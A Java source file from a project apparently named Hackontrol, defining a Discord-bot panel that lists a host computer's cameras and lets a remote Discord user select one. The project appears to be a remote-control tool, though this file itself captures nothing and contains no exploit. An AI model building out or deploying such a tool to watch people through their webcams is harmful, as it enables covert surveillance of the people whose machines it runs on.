package com.khopan.hackontrol.panel;

import java.util.ArrayList;
import java.util.List;

import com.khopan.camera.Camera;
import com.khopan.hackontrol.registry.Registration;
import com.khopan.hackontrol.service.interaction.ButtonManager;
import com.khopan.hackontrol.service.interaction.ButtonManager.ButtonType;
import com.khopan.hackontrol.service.interaction.InteractionManager;
import com.khopan.hackontrol.service.interaction.ModalManager;
import com.khopan.hackontrol.utils.HackontrolError;
import com.khopan.hackontrol.utils.HackontrolMessage;
import com.khopan.hackontrol.utils.interaction.HackontrolButton;
import com.khopan.hackontrol.utils.sendable.sender.ReplyCallbackSendable;

import net.dv8tion.jda.api.interactions.callbacks.IReplyCallback;
import net.dv8tion.jda.api.interactions.components.ItemComponent;
import net.dv8tion.jda.api.interactions.components.buttons.Button;
import net.dv8tion.jda.api.interactions.components.text.TextInput;
import net.dv8tion.jda.api.interactions.components.text.TextInputStyle;

public class CameraPanel extends Panel {
	private static final String PANEL_NAME = "camera";

	private static final Button BUTTON_CAMERA_LIST = ButtonManager.staticButton(ButtonType.SUCCESS, "Camera List", "cameraList");
	private static final Button BUTTON_REFRESH     = ButtonManager.staticButton(ButtonType.SUCCESS, "Refresh",     "cameraRefresh");

	private Camera[] cameraList;
	private Camera selected;

	@Override
	public String panelName() {
		return CameraPanel.PANEL_NAME;
	}

	@Override
	public void registeration() {
		this.register(Registration.BUTTON, CameraPanel.BUTTON_CAMERA_LIST, context -> {
			this.cameraList = Camera.list();
			this.send(context);
		});

		this.register(Registration.BUTTON, CameraPanel.BUTTON_REFRESH,     context -> {
			this.send(context);
			HackontrolMessage.delete(context);
		});
	}

	@Override
	public ControlWidget[] controlWidget() {
		return new ControlWidget[] {
				ControlWidget.newBuilder()
				.actionRow(CameraPanel.BUTTON_CAMERA_LIST)
				.build()
		};
	}

	private void send(IReplyCallback callback) {
		if(this.cameraList == null || this.cameraList.length == 0) {
			HackontrolError.message(ReplyCallbackSendable.of(callback), "No camera available");
			return;
		}

		StringBuilder builder = new StringBuilder();
		boolean hasSelected = false;

		for(int i = 0; i < this.cameraList.length; i++) {
			if(i > 0) {
				builder.append('\n');
			}

			Camera camera = cameraList[i];
			boolean selected = camera.equals(this.selected);

			if(selected) {
				builder.append("**");
			}

			builder.append('`');
			builder.append(i + 1);
			builder.append(") ");
			builder.append(camera.getName());

			if(selected) {
				builder.append(" (Selected)");
			}

			builder.append('`');

			if(selected) {
				builder.append("**");
			}

			if(selected) {
				hasSelected = true;
			}
		}

		List<ItemComponent> list = new ArrayList<>();
		list.add(ButtonManager.dynamicButton(ButtonType.SUCCESS, "Select", buttonContext -> {
			if(cameraList.length == 1) {
				this.selected = cameraList[0];
				this.send(buttonContext);
				HackontrolMessage.delete(buttonContext);
				return;
			} else if(this.cameraList.length == 2) {
				Camera newSelected = null;

				if(this.cameraList[0].equals(this.selected)) {
					newSelected = this.cameraList[1];
				} else if(this.cameraList[1].equals(this.selected)) {
					newSelected = this.cameraList[0];
				}

				if(newSelected != null) {
					this.selected = newSelected;
					this.send(buttonContext);
					HackontrolMessage.delete(buttonContext);
					return;
				}
			}

			buttonContext.replyModal(ModalManager.dynamicModal("Select Camera", modalContext -> {
				String text = modalContext.getValue("cameraIndex").getAsString();
				int index;

				try {
					index = Integer.parseInt(text);
				} catch(Throwable Errors) {
					HackontrolError.message(modalContext.reply(), "Invalid number format");
					return;
				}

				if(index < 1 || index > this.cameraList.length) {
					HackontrolError.message(modalContext.reply(), "Index " + index + " out of bounds, expected 1 - " + this.cameraList.length);
					return;
				}

				this.selected = this.cameraList[index - 1];
				this.send(modalContext);
				HackontrolMessage.delete(buttonContext);
			}).addActionRow(TextInput.create("cameraIndex", "Camera Index", TextInputStyle.SHORT).setRequired(true).setMinLength(1).setMaxLength(Integer.toString(this.cameraList.length).length()).setPlaceholder("1 - " + this.cameraList.length).build()).build()).queue();
		}));

		list.add(CameraPanel.BUTTON_REFRESH);
		list.add(HackontrolButton.delete());
		callback.reply(builder.toString()).addActionRow(list).queue(InteractionManager :: callback);
	}
}
